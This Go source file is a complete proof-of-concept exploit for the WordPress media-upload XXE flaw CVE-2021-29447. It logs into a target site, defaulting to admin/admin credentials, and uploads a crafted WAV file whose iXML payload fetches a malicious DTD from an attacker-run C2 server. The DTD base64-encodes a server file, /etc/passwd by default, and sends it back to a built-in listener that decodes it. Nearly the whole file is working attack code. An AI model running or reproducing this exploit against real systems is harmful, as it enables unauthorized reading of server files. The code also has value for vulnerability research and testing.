package main

//================================================================================
//
// Progarm Name: CVE-2021-29447
//
// Author: Thomas Osgood
//
// Description:
//
//        This function is a Proof Of Concept meant to automate the exploitation
//        of the Wordpress Media vulnerability (CVE-2021-29447). This program
//        has the ability to either a) generate the malicious wav and dtd files or
//        b) generate the malicious wav and dtd files, login to the vulnerable
//        Wordpress site, and upload the wav (tiggering the exploit).
//
//        The names of the created files are "mal.wav" and "mal.dtd". When these
//        two files are generated by this program, they are saved in the same
//        directory as the program; this means that the C2 server will have to
//        be pointing to the directory this program is executed in.
//
//        If no target file is specified (-f), the program will attempt to leak
//        the contents of "/etc/passwd".
//
//        For the entire exploit to be run (generation + login + upload), the
//        "-l" flag must be set (as shown in example call #2).
//
//        The "zlib.deflate" option may be necessary to extract the contents of
//        certain files. To use "zlib.deflate", you can set the "-d" flag in when
//        entering the command-line arguments. Setting this flag will also
//        generate a "deflate.php" file that you can pass the base64 into to
//        inflate and base64 decode the data (php deflate.php <base64>). An
//        example of this is shown in the third (3rd) example call below.  This
//        flag can be set with or without the "-l" flag being set.
//
//================================================================================
//
// Build Command:
//
//        go build CVE202129447.go
//
//================================================================================
//
// Example Calls:
//
//        ./exploit -i <c2IP> -p <c2Port> -f <targetFileName>
//        ./exploit -t <targetIP> -i <c2IP> -p <c2Port> -U <user> -P <password> -l
//        ./exploit -i <c2IP> -f <targetFilename> -d
//
//================================================================================

import (
	"bytes"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"mime/multipart"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/textproto"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"
)

//================================================================================
// Global Variables: Attack Flags
//================================================================================
var DEFLATE_DATA bool = false

//================================================================================
// Global Variables: Server
//================================================================================
var SRV http.Server

//================================================================================
// Global Variables: Formatting And Output
//================================================================================

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

//================================================================================
// Custom Type Definitions: Session Management
//================================================================================

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
}

type CookieJar struct {
	jar map[string][]*http.Cookie
}

//================================================================================
// Functions: Formatting And Output
//================================================================================

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

//================================================================================

//================================================================================
//
// Function Name: CreateMultiPartData
//
// Author: Thomas Osgood
//
// Description:
//
//        Function designed to create the multipart form data that will be used
//        when POSTing to "async-upload.php".
//
// Input(s):
//
//        filename - string. name of file to upload.
//        content - []byte. byte content of the file to upload.
//        fileWriter - *multipart.Writer. writer to use for upload.
//
// Return(s):
//
//        success - bool. indication of successful execution.
//        message - string. status message.
//
//================================================================================
func (c *Client) CreateMultiPartData(filename string, content []byte, fileWriter *multipart.Writer) (success bool, message string) {
	defer fileWriter.Close()

	//------------------------------------------------------------
	// Set WAV part
	//------------------------------------------------------------

	header := make(textproto.MIMEHeader)
	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"; filename=\"%s\"", "async-upload", filename))
	header.Set("Content-Type", "audio/x-wav")

	SysMsgNB("creating part data ...")
	part, err := fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write(content)

	//------------------------------------------------------------
	// Set Upload part
	//------------------------------------------------------------

	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"", "html-upload"))
	header.Del("Content-Type")
	part, err = fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte("Upload"))

	nonce, success, message := c.GetNonce()
	if !success {
		return false, message
	}

	//------------------------------------------------------------
	// Add NONCE part
	//------------------------------------------------------------

	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"", "_wpnonce"))
	part, err = fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte(nonce))

	return true, "multipart data created"
}

//================================================================================
//
// Function Name: GetNonce
//
// Author: Thomas Osgood
//
// Description:
//
//        Function designed to get the _wpnonce used in the file upload process.
//        This is necessary for making a successful POST request to the
//        async-upload.php endpoint.
//
// Input(s):
//
//        None.
//
// Return(s):
//
//        nonce - string. nonce pulled from the "media-new" page.
//        success - bool. indication of successful execution.
//        message - string. status message.
//
//================================================================================
func (c *Client) GetNonce() (nonce string, success bool, message string) {
	var targetURL string = fmt.Sprintf("%s/wp-admin/media-new.php", c.baseURL)
	var targetPattern string = `name="_wpnonce" value="[a-zA-Z0-9]+"`

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return "", false, err.Error()
	}
	defer resp.Body.Close()

	bodycontent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", false, err.Error()
	}

	re, err := regexp.Compile(targetPattern)
	if err != nil {
		return "", false, err.Error()
	}

	matches := re.FindAll(bodycontent, -1)
	if len(matches) < 1 {
		return "", false, "nonce not found"
	}

	nonce = strings.Replace(strings.Split(string(matches[0]), "value=")[1], "\"", "", -1)

	return nonce, true, "nonce pulled from page"
}

//================================================================================
//
// Function Name: Login
//
// Author: Thomas Osgood
//
// Description:
//
//        Function designed to login to a Wordpress site and set the PHPSESSID
//        cookie for the Client.
//
// Input(s):
//
//        username - string. username used in the login process.
//        password - string. password used in the login process.
//
// Return(s):
//
//        success - bool. indication of successful execution.
//        message - string. status message.
//
//================================================================================
func (c *Client) Login(username string, password string) (success bool, message string) {
	var targetURL string = fmt.Sprintf("%s/wp-login.php", c.baseURL)
	var bodyData url.Values = url.Values{}

	// Set data to send in the request body
	bodyData.Set("log", username)
	bodyData.Set("pwd", password)

	SysMsgNB("building login request ...")
	// Build request
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(bodyData.Encode()))
	if err != nil {
		return false, err.Error()
	}

	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36")

	// Make request to target
	SysMsgNB(fmt.Sprintf("attempting login with \"%s:%s\"", username, password))
	resp, err := c.Session.Do(req)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	// Read response
	bodycontent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err.Error()
	}

	// Check for key phrases that indicate failure
	bcstring := string(bodycontent)
	if strings.Contains(bcstring, "The password you entered for the username") || strings.Contains(bcstring, "The username") || strings.Contains(bcstring, "Unknown username") {
		return false, "login failed"
	}

	if strings.Contains(bcstring, "Cookies are blocked") {
		return false, "\"cookies not supported\" error encountered"
	}

	// Save session cookies for later use
	cookieURL, err := url.Parse(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	c.Session.Jar.SetCookies(cookieURL, resp.Cookies())

	return true, "login successful"
}

//================================================================================
//
// Function Name: SetUploadCookies
//
// Author: Thomas Osgood
//
// Description:
//
//        Function designed to set the cookies necessary for uploading a file
//        to the target Wordpress site.
//
// Input(s):
//
//        None.
//
// Return(s):
//
//        success - bool. indication of successful execution.
//        message - string. status message.
//
//================================================================================
func (c *Client) SetUploadCookies() (success bool, message string) {
	var targetURL string = fmt.Sprintf("%s/wp-admin/upload.php", c.baseURL)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	cookieURL, err := url.Parse(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	c.Session.Jar.SetCookies(cookieURL, resp.Cookies())

	return true, "upload cookies set"
}

//================================================================================
//
// Function Name: UploadExploit
//
// Author: Thomas Osgood
//
// Description:
//
//        Function designed to upload a malicious wav file to a wordpress site.
//        This wav file will leak the contents of a specified file by reaching
//        out to a C2 server and downloading a malicious DTD file.
//
// Input(s):
//
//        filename - string. name of malicious wav file.
//
// Return(s):
//
//        success - bool. indication of successful execution of the exploit.
//        message - string. status message.
//
//================================================================================
func (c *Client) UploadExploit(filename string) (success bool, message string) {
	var targetURL string = fmt.Sprintf("%s/wp-admin/async-upload.php", c.baseURL)

	var contentBuf *bytes.Buffer = new(bytes.Buffer)
	var fileWriter multipart.Writer = *multipart.NewWriter(contentBuf)

	SysMsgNB(fmt.Sprintf("reading contents of \"%s\"", filename))
	// Read byte content of malicious wav file
	readContent, success, message := GetWavData(filename)
	if !success {
		return false, message
	}

	// Build the multipart data to upload to the target
	success, message = c.CreateMultiPartData(filename, readContent, &fileWriter)
	if !success {
		return false, message
	}

	SysMsgNB("sending request ...")
	resp, err := c.Session.Post(targetURL, fileWriter.FormDataContentType(), contentBuf)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	respcontent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err.Error()
	}

	if strings.Contains(strings.ToLower(string(respcontent)), strings.ToLower("no file was uploaded")) {
		return false, "\"no file uploaded\" error"
	}

	return true, "exploit upload successful"
}

//================================================================================
//
// Function Name: CreateMaliciousDTD
//
// Author: Thomas Osgood
//
// Description:
//
//        Function designed to create and save a malicious DTD file for use
//        in the exploit. Once executed, this DTD file will cause the target
//        to reach out to the C2 server and leak the contents of the target file
//        by requesting the base64 encoded content of the file via URL param.
//
// Input(s):
//
//        c2ip - string. IP or domain of the C2 server to be used.
//        c2port - int. port used by C2 server.
//        targetFile - string. file to get contents of.
//
// Return(s):
//
//        success - bool. indication of successful execution.
//        message - string. status message.
//
//================================================================================
func CreateMaliciousDTD(c2ip string, c2port int, targetFile string) (success bool, message string) {
	var line1 string
	var line2 string = "<!ENTITY %% init \"<!ENTITY &#x25; trick SYSTEM 'http://%s:%d/data/?p=%%file;'>\">"

	if DEFLATE_DATA {
		success, message = CreatePHPDecodeFile()
		if !success {
			ErrMsg(fmt.Sprintf("unable to create decode php file: %s", message))
		} else {
			SucMsg(message)
		}
		line1 = fmt.Sprintf("<!ENTITY %% file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource=%s\">", targetFile)
	} else {
		line1 = fmt.Sprintf("<!ENTITY %% file SYSTEM \"php://filter/read=convert.base64-encode/resource=%s\">", targetFile)
	}
	line2 = fmt.Sprintf(line2, c2ip, c2port)

	SysMsgNB("generating malicious dtd ...")
	fptr, err := os.Create("mal.dtd")
	if err != nil {
		return false, err.Error()
	}
	defer fptr.Close()

	_, err = fptr.Write([]byte(line1))
	if err != nil {
		return false, err.Error()
	}

	_, err = fptr.Write([]byte(line2))
	if err != nil {
		return false, err.Error()
	}

	return true, "malicious DTD created"
}

//================================================================================
//
// Function Name: CreateMaliciousWAV
//
// Author: Thomas Osgood
//
// Description:
//
//        Function designed to create a malicious wav file that will exploit
//        Wordpress' CVE-2021-29447 vulnerability.
//
// Input(s):
//
//        c2ip - string. IP or domain of the C2 server to be used.
//        c2port - int. port used by C2 server.
//
// Return(s):
//
//        success - bool. indication of successful execution.
//        message - string. status message.
//
//================================================================================
func CreateMaliciousWAV(c2ip string, c2port int) (success bool, message string) {
	const header string = "RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00"
	var payload string = "%s<?xml version=\"1.0\"?><!DOCTYPE ANY[<!ENTITY %% remote SYSTEM 'http://%s:%d/mal.dtd'>%%remote;%%init;%%trick;]>\x00"

	SysMsgNB("generating malicious wav ...")
	payload = fmt.Sprintf(payload, header, c2ip, c2port)

	fptr, err := os.Create("mal.wav")
	if err != nil {
		return false, err.Error()
	}
	defer fptr.Close()

	_, err = fptr.Write([]byte(payload))
	if err != nil {
		return false, err.Error()
	}

	return true, "malicious wav file created"
}

//================================================================================
//
// Function Name: CreatePHPDecodeFile
//
// Author: Thomas Osgood
//
// Description:
//
//        Function designed to create a PHP file to decode the zlib_deflate data
//        if the user specified the "-d" argument.
//
// Input(s):
//
//        None.
//
// Return(s):
//
//        success - bool. indication of successful execution.
//        message - string. status message.
//
//================================================================================
func CreatePHPDecodeFile() (success bool, message string) {
	var content string = "<?php\n%s\n%s\n?>"
	var argCheck string = "if (count($argv) <= 1) {\n\techo \"!!! must pass in base64 to decode !!!\\n\\n\";\n\techo \"example:\\n\\tphp \".$argv[0].\" <base64>\";\n\texit(-1);\n}"
	var decodeLine string = "echo zlib_decode(base64_decode($argv[1]));"

	SysMsgNB("creating php decode file ...")
	content = fmt.Sprintf(content, argCheck, decodeLine)

	fptr, err := os.Create("deflate.php")
	if err != nil {
		return false, err.Error()
	}
	defer fptr.Close()

	_, err = fptr.Write([]byte(content))
	if err != nil {
		return false, err.Error()
	}

	return true, "php decode file created"
}

//================================================================================
//
// Function Name: GenPayload
//
// Author: Thomas Osgood
//
// Description:
//
//        Function designed to generate both the WAV and DTD file needed for the
//        exploit to successfully execute.
//
// Input(s):
//
//        c2ip - string. ip address (or domain) of C2 server.
//        c2port - string. port to contact the C2 server on.
//        targetFile - string. file to leak.
//
// Return(s):
//
//        success - bool. indication of successful execution.
//        message - string. status message.
//
//================================================================================
func GenPayload(c2ip string, c2port int, targetFile string) (success bool, message string) {
	success, message = CreateMaliciousDTD(c2ip, c2port, targetFile)
	if !success {
		return false, message
	}

	success, message = CreateMaliciousWAV(c2ip, c2port)
	if !success {
		return false, message
	}

	return true, "wav and dtd files generated successfully"
}

//================================================================================
//
// Function Name: GetWavData
//
// Author: Thomas Osgood
//
// Description:
//
//        Function designed to read the byte contents of a wav file and return
//        them to them.
//
// Input(s):
//
//        filename - string. name of wav file to read.
//
// Return(s):
//
//        content - []byte. byte contents read from file.
//        success - bool. indication of successful execution.
//        message - string. status message.
//
//================================================================================
func GetWavData(filename string) (content []byte, success bool, message string) {
	SysMsgNB(fmt.Sprintf("reading \"%s\" ...", filename))

	content, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, false, err.Error()
	}
	return content, true, "wav data read successfully"
}

//
// Function Name: GrabIPs
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to acquire all IPv4 network addresses
//    attached to the current machine. If the targetIface
//    argument is set to "", all network interfaces will be
//    searched. If a specific network interface is speficied,
//    only that interface's IP address(es) will be returned.
//    If the specified network interface does not exist, an
//    error will be returned.
//
// Input(s):
//
//    targetIface - string. interface to get IP for.
//
// Return(s):
//
//    ipList - []net.IP. list of IP addresses acquired.
//    err - error. error or nil.
//
func GrabIPs(targetIface string) (ipList []net.IP, err error) {
	var address net.Addr
	var addresses []net.Addr
	var foundiface bool = false
	var iface net.Interface
	var interfaces []net.Interface
	var ip net.IP

	//------------------------------------------------------------
	// grab all network interfaces
	//------------------------------------------------------------
	interfaces, err = net.Interfaces()
	if err != nil {
		return nil, err
	}

	for _, iface = range interfaces {

		//------------------------------------------------------------
		// ignore loopback addresses (127.0.0.1)
		//------------------------------------------------------------
		if strings.Contains(iface.Flags.String(), net.FlagLoopback.String()) {
			continue
		}

		//------------------------------------------------------------
		// if target interface is set, only display target
		//------------------------------------------------------------
		if (len(targetIface) > 0) && (iface.Name != targetIface) {
			continue
		}

		foundiface = true

		//------------------------------------------------------------
		// grab all addresses from current interface
		//------------------------------------------------------------
		addresses, err = iface.Addrs()
		if err != nil {
			return nil, err
		}

		//------------------------------------------------------------
		// loop through all addresses present in current interface
		//------------------------------------------------------------
		for _, address = range addresses {
			switch v := address.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			//------------------------------------------------------------
			// only grab IPv4 addresses
			//------------------------------------------------------------
			if ip.To4() == nil {
				continue
			}

			ipList = append(ipList, ip)
		}
	}

	//------------------------------------------------------------
	// error finding target (or any) network interface
	//------------------------------------------------------------
	if (len(targetIface) > 0) && !foundiface {
		return nil, errors.New(fmt.Sprintf("unable to find interface \"%s\"", targetIface))
	} else if !foundiface {
		return nil, errors.New("no network interfaces discovered")
	}

	return ipList, nil
}

//
// Function Name: GrabData
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to get and decode the base64 data
//    delivered to the HTTP server by the target.
//
// Input(s):
//
//    w - http.ResponseWriter. HTTP response object. Not Used.
//    r - *http.Request. Request to decode.
//
// Return(s):
//
//    None
//
func GrabData(w http.ResponseWriter, r *http.Request) {
	var base64data string
	var command *exec.Cmd
	var decodedBytes []byte
	var decoded string
	var err error
	var output []byte

	if DEFLATE_DATA {
		//------------------------------------------------------------
		// Deflate option selected. Call PHP function to deflate and
		// decode data posted by target.
		//------------------------------------------------------------

		base64data = strings.Split(r.RequestURI, "?p=")[1]

		command = exec.Command("php", "deflate.php", base64data)
		output, err = command.CombinedOutput()
		if err != nil {
			ErrMsg(err.Error())
			return
		}
		decoded = string(output)
	} else {
		//------------------------------------------------------------
		// No deflate option selected. Base64 decode the data string
		// posted by the target.
		//------------------------------------------------------------

		base64data = strings.Trim(strings.Split(r.RequestURI, "?p=")[1], "=")

		decodedBytes, err = base64.RawStdEncoding.DecodeString(base64data)
		if err != nil {
			ErrMsg(err.Error())
			return
		}
		decoded = string(decodedBytes)
	}
	decoded = strings.Trim(decoded, "\n")

	//------------------------------------------------------------
	// Shutdown server
	//------------------------------------------------------------
	SRV.Close()

	fmt.Printf("%s------------------------------------------------------------%s\n", ANSI_RED, ANSI_RST)
	fmt.Printf("%s\n", decoded)
	fmt.Printf("%s------------------------------------------------------------%s\n", ANSI_RED, ANSI_RST)

	return
}

//
// Function Name: StartListener
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to create an HTTP server to use during
//    this attack. It can deliver files to the target and decode
//    data coming from the target.
//
// Input(s):
//
//    ip - string. ip address to listen on.
//    port - int. port to listen on.
//    wg - *sync.WaitGroup. waitgroup this is a part of.
//
// Return(s):
//
//    err - error. error or nil.
//
func StartListener(ip string, port int, wg *sync.WaitGroup) (err error) {
	defer wg.Done()

	SRV = http.Server{Addr: fmt.Sprintf("%s:%d", ip, port)}

	var currentDir string
	var fs http.Handler

	currentDir, err = os.Getwd()

	fs = http.FileServer(http.Dir(currentDir))

	http.Handle("/", http.StripPrefix("/", fs))
	http.HandleFunc("/data/", GrabData)

	if err = SRV.ListenAndServe(); err != http.ErrServerClosed {
		ErrMsg(err.Error())
		return err
	}
	SucMsg("server successfully shutdown")

	return nil
}

func main() {
	//------------------------------------------------------------
	// Create variables for session management
	//------------------------------------------------------------
	var client *Client = &Client{Session: &http.Client{Timeout: 30 * time.Second}}
	var sessionjar *cookiejar.Jar

	//------------------------------------------------------------
	// Create variables to hold command-line inputs
	//------------------------------------------------------------
	var deflate bool
	var login bool

	var c2ip string
	var c2port int
	var iface bool

	var username string
	var password string

	var targetDomain string
	var targetFile string

	var ips []net.IP
	var err error

	var success bool
	var message string

	var wg sync.WaitGroup

	//------------------------------------------------------------
	// Setup command line arguments
	//------------------------------------------------------------
	flag.StringVar(&targetDomain, "t", "127.0.0.1", "domain to conduct attack against")
	flag.StringVar(&targetFile, "f", "/etc/passwd", "file to leak")

	flag.StringVar(&c2ip, "i", "127.0.0.1", "IP address of C2 server")
	flag.IntVar(&c2port, "p", 9999, "Port to contact C2 server on")
	flag.BoolVar(&iface, "interface", false, "C2IP is a network interface, not an IP or domain")

	flag.BoolVar(&login, "l", false, "attempt login using credentials")

	flag.StringVar(&username, "U", "admin", "user to attempt exploit with")
	flag.StringVar(&password, "P", "admin", "password to use for login")

	flag.BoolVar(&deflate, "d", false, "use zlib_deflate function to encode data")
	flag.Parse()

	//------------------------------------------------------------
	// Set global DEFLATE var based on command-line arg
	//------------------------------------------------------------
	DEFLATE_DATA = deflate

	//------------------------------------------------------------
	// if "c2" specified is a network interface, take the
	// IP address of the interface and assign it to the
	// c2 variable to be used
	//------------------------------------------------------------
	if iface {
		ips, err = GrabIPs(c2ip)
		if err != nil {
			ErrMsg(err.Error())
			os.Exit(1)
		}
		c2ip = ips[0].String()
	}

	//------------------------------------------------------------
	// Make sure C2 port is within valid port range
	//------------------------------------------------------------
	success, message = ValidatePort(c2port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	//------------------------------------------------------------
	// Create cookie jar for session management
	//------------------------------------------------------------
	sessionjar, err = cookiejar.New(nil)
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}

	//------------------------------------------------------------
	// If login flag set, attempt login with creds and upload
	// malicious wav and dtd files.
	//
	// If login flag is not set, create the malicious wav and
	// dtd files only.
	//------------------------------------------------------------
	if login {
		client.baseURL = fmt.Sprintf("http://%s", targetDomain)
		client.Session.Jar = sessionjar

		wg.Add(1)
		go StartListener(c2ip, c2port, &wg)

		success, message := client.Login(username, password)
		if !success {
			ErrMsg(message)
			os.Exit(1)
		}
		SucMsg(message)

		success, message = GenPayload(c2ip, c2port, targetFile)
		if !success {
			ErrMsg(message)
			os.Exit(1)
		}
		SucMsg(message)

		success, message = client.UploadExploit("mal.wav")
		if !success {
			ErrMsg(message)
			os.Exit(1)
		}
		SucMsg(message)

		wg.Wait()
	} else {
		success, message := GenPayload(c2ip, c2port, targetFile)
		if !success {
			ErrMsg(message)
			os.Exit(1)
		}
		SucMsg(message)
	}

	return
}

